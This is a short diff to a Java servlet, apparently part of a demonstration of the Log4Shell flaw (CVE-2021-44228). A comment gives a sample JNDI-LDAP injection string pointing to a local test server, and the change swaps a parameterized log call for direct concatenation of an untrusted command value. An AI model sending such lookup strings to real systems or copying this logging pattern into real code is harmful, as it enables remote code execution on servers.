@@ -24,7 +24,7 @@ public class Servlet extends HttpServlet {
         else {
             // CVE-2021-44228 (RCE) may be exploited using
             // cmd that equals ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/Y2FsYy5leGU=}
-            log.error("Unsupported command: {}", cmd);
+            log.error("Unsupported command: " + cmd);
         }
     }
 }
